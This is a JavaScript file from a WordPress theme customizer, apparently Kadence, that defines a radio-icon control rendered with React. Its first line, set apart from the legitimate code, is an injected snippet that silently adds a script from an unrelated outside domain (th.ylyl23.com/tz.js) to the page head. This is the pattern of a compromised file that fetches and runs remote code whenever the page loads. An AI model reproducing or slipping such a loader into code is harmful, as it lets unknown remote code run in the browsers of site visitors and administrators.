(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import RadioIconComponent from './radio-icon-component.js';

export const RadioIconControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <RadioIconComponent control={control}/> );
		// ReactDOM.render(
		// 		<RadioIconComponent control={control}/>,
		// 		control.container[0]
		// );
	}
} );
